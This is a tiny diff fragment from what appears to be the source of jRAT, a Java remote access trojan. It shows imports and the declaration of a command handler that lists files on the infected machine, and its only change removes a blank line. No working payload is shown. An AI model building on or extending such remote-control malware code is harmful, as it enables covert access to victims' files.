@@ -5,7 +5,6 @@ import java.io.File;
 import pro.jrat.stub.Connection;
 import pro.jrat.stub.packets.outgoing.Packet19ListFiles;
 
-
 public class Packet15ListFiles extends AbstractIncomingPacket {
 
 	@Override
